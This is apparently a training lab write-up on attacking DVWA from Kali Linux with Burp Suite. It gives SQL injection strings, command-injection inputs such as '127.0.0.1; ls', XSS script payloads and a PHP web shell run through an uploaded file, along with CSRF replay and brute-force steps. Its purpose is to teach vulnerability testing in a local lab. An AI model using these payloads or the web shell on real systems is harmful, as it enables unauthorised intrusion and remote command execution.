# 🔐 TASK 4 – Advanced Web Application Exploitation using DVWA  
*(Kali Linux + DVWA + Burp Suite)*

---

## 🧭 Objective

In this task, we:

- ✅ Exploited multiple DVWA vulnerabilities  
- ✅ Observed how security levels impact attacks  
- ✅ Performed advanced web exploitation techniques  
- ✅ Studied mitigation strategies  

⚠️ **All testing performed inside a local lab environment only.**

---

## 🖥 Lab Setup

Ensure the following environment:

- OS: Kali Linux  
- Web Application: DVWA  
- Browser: Firefox  
- Proxy Tool: Burp Suite  
- DVWA Security Level: Low / Medium / High  

---

# 🔥 PART 1 – SQL Injection

### Step 1: Navigate to

`DVWA → SQL Injection`

---

### Step 2: Set Security to LOW

`DVWA → DVWA Security → Select LOW → Submit`

---

### Step 3: Normal Input Test

Enter:

```sql
1
```

✔ Returns one user record.

---

### Step 4: SQL Injection Payload

Enter:

```sql
1' OR '1'='1
```

✔ Application returns all records.

**Conclusion:** Application is vulnerable to SQL Injection.

---

### Step 5: Test at Medium Level

Set Security → Medium  

Try:

```sql
1 OR 1=1
```

Observe filtering behavior.

---

### Step 6: Test at High Level

High level sanitizes input.  
Limited results returned.

---

# 🔥 PART 2 – Command Injection

Navigate to:

`DVWA → Command Injection`

---

### Step 1: Normal Input

```bash
127.0.0.1
```

---

### Step 2: Inject Command

```bash
127.0.0.1; ls
```

OR

```bash
127.0.0.1 && whoami
```

✔ If system command executes → Vulnerable.

---

# 🔥 PART 3 – Cross-Site Scripting (XSS)

## Stored XSS

Navigate to:

`DVWA → XSS (Stored)`

Name:

```text
test
```

Message:

```html
<script>alert("XSS")</script>
```

✔ Popup alert confirms Stored XSS.

---

## Reflected XSS

Navigate to:

`DVWA → XSS (Reflected)`

Enter:

```html
<script>alert(1)</script>
```

✔ Alert popup confirms Reflected XSS.

---

# 🔥 PART 4 – File Upload Vulnerability

Navigate to:

`DVWA → File Upload`

---

### Step 1: Create Malicious PHP File

On Kali:

```bash
nano shell.php
```

Add:

```php
<?php
if(isset($_GET['cmd'])){
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>
```

Save file.

---

### Step 2: Upload File

Upload `shell.php` via DVWA File Upload module.

---

### Step 3: Execute Command

Access:

```bash
http://127.0.0.1/DVWA/hackable/uploads/shell.php?cmd=whoami
```

✔ Output returned:

```
www-data
```

**Conclusion:** Remote Command Execution achieved.

⚠ Testing performed only in local lab.

---

# 🔥 PART 5 – CSRF Attack

Navigate to:

`DVWA → CSRF`

1. Change password normally.
2. Capture request using Burp Suite.
3. Replay request without CSRF token (Low security).
4. Compare behavior at Medium and High security levels.

Observe token validation differences.

---

# 🔥 PART 6 – Brute Force Attack

Navigate to:

`DVWA → Brute Force`

Security: Low  

Try:

```text
Username: admin
Password: password
```

Test common combinations.

At High security:
- CAPTCHA protection observed.

---

# 🛡 PART 7 – Security Level Comparison

| Security Level | Behavior |
|---------------|----------|
| Low | No validation |
| Medium | Partial filtering |
| High | Stronger validation |
| Impossible | Secure implementation |

---

# 📑 Deliverables

- ✅ SQL Injection demonstration
- ✅ Command Injection exploitation
- ✅ XSS (Stored & Reflected)
- ✅ File Upload Remote Command Execution
- ✅ CSRF behavior analysis
- ✅ Brute Force testing
- ✅ Security level comparison report

---

# 🎯 Conclusion

This lab demonstrates how improper input validation, weak authentication mechanisms, and insecure file handling can lead to serious web application vulnerabilities.

Understanding these weaknesses is essential for building secure applications and performing ethical security assessments.
